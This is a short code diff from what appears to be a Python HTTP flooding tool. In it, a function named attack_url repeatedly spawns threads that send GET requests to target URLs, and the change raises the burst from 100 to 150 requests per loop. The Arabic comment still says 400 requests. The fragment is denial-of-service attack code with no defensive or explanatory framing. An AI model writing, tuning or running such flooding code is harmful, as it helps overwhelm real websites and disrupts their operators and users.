@@ -29,7 +29,7 @@ def load_urls():
 def attack_url(url):
     while is_running:
         try:
-            for _ in range(100):  # إرسال 400 طلب دفعة واحدة
+            for _ in range(150):  # إرسال 400 طلب دفعة واحدة
                 threading.Thread(target=requests.get, args=(url,), daemon=True).start()
         except:
             pass
